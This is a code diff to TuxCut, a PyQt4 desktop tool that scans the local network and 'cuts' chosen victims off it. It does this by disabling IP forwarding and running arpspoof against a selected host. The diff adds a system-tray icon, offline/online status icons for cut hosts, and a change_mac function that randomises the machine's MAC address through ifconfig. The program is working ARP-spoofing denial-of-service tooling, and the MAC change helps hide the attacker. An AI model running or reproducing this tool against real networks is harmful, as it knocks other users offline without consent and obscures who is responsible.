@@ -1,8 +1,9 @@
 # -*- coding: utf-8 -*-
 import os
-import socket
+import random
 import subprocess as sp
 from PyQt4 import QtCore,QtGui,uic
+import pix_rc
 
 class TuxCut(QtGui.QMainWindow):
 	def __init__(self):
@@ -13,12 +14,13 @@ class TuxCut(QtGui.QMainWindow):
 		self._iface =None
 		self._isProtected = False
 		self._isFedora = True
+		self._isQuit = False
 		self._cutted_hosts = {}
 		
 		self._gwIP = self.default_gw()
 		self._gwMAC = self.gw_mac(self._gwIP)
-		
-		print "The Mac is :",self._gwMAC
+		self._my_mac = self.get_mymac()
+		self.lbl_mac.setText(self._my_mac)
 		
 		self.enable_protection()
 		self.list_hosts(self._gwIP)
@@ -36,8 +38,37 @@ class TuxCut(QtGui.QMainWindow):
 		self.table_hosts.setColumnWidth(1,150)
 		self.table_hosts.setColumnWidth(2,75)
 		self.show()
+		self.tray_icon()
 
-			
+	def tray_icon(self):
+		self.trayicon=QtGui.QSystemTrayIcon(QtGui.QIcon(':pix/pix/tuxcut.png'))
+		self.trayicon.show()
+		self.menu=QtGui.QMenu()
+		
+		self.menu.addAction(self.action_change_mac)
+		self.menu.addAction(self.action_quit)
+		
+		self.trayicon.setContextMenu(self.menu)
+		self.trayicon.activated.connect(self.onTrayIconActivated)
+		
+	def onTrayIconActivated(self, reason):
+		if reason == QtGui.QSystemTrayIcon.DoubleClick:
+			if self.isVisible():
+				self.hide()
+			else:
+				self.show()
+				
+	def closeEvent(self, event):
+		'''
+		This make the close button just hide the application
+		'''
+		if not self._isQuit:
+			event.ignore()     
+			if self.isVisible():
+				self.hide()
+		else:
+			self.close()
+
 	def default_gw(self):
 		args = ['route','list']
 		gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
@@ -46,11 +77,18 @@ class TuxCut(QtGui.QMainWindow):
 				self._iface = line.split()[4]
 				return  line.split()[2]
 				
+				
 
 	def gw_mac(self,gwip):
 		arping = sp.Popen(['arp-scan','--interface',self._iface,self._gwIP],stdout = sp.PIPE)
 		for line in arping.stdout:
 			if line.startswith(self._gwIP.split('.')[0]):
+				return line.split()[1]
+	
+	def get_mymac(self):
+		proc = sp.Popen(['ifconfig',self._iface],stdout = sp.PIPE)
+		for line in proc.stdout:
+			if line.startswith('        ether'):
 				return line.split()[1]
 				
 	def list_hosts(self, ip):
@@ -69,6 +107,7 @@ class TuxCut(QtGui.QMainWindow):
 				mac= line.split()[1]
 				self.table_hosts.setRowCount(i)
 				self.table_hosts.setItem(i-1,0,QtGui.QTableWidgetItem(ip))
+				self.table_hosts.item(i-1,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
 				self.table_hosts.setItem(i-1,1,QtGui.QTableWidgetItem(mac))
 				i=i+1
 					
@@ -91,7 +130,7 @@ class TuxCut(QtGui.QMainWindow):
 		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		self._isProtected = False
 		
-	def cut_process(self,victim_IP):
+	def cut_process(self,victim_IP,row):
 		## Disable ip forward
 		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		print self._iface
@@ -100,6 +139,7 @@ class TuxCut(QtGui.QMainWindow):
 		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		#self._cutted_hosts.setdefault(victim_IP,proc.pid)
 		self._cutted_hosts[victim_IP]=proc.pid
+		self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/offline.png'))
 		print self._cutted_hosts
 	
 	def resume_all(self):
@@ -117,6 +157,17 @@ class TuxCut(QtGui.QMainWindow):
 		else:
 			print victim_IP,'is not attacked'
 		
+	def change_mac(self):
+		new_MAC =':'.join(map(lambda x: "%02x" % x, [ 0x00,
+													random.randint(0x00, 0x7f),
+													random.randint(0x00, 0x7f),
+													random.randint(0x00, 0x7f),
+													random.randint(0x00, 0xff),
+													random.randint(0x00, 0xff)]))
+		print new_MAC
+		self.lbl_mac.setText(new_MAC)
+		sp.Popen(['ifconfig',self._iface,'down','hw','ether',new_MAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		sp.Popen(['ifconfig',self._iface,'up'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		
 	def on_protection_changes(self):
 		if self.cbox_protection.isChecked():
@@ -129,9 +180,10 @@ class TuxCut(QtGui.QMainWindow):
 	
 	def on_cut_clicked(self):
 		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
+		print selectedRow
 		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
 		if not victim_IP==None:
-			self.cut_process(victim_IP)
+			self.cut_process(victim_IP,selectedRow)
 
 	def on_resume_clicked(self):
 		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
@@ -139,3 +191,6 @@ class TuxCut(QtGui.QMainWindow):
 		if not victim_IP==None:
 			self.resume_single_host(victim_IP)
 		
+	def on_quit_triggered(self):
+		self._isQuit = True
+		self.closeEvent(QtGui.QCloseEvent)
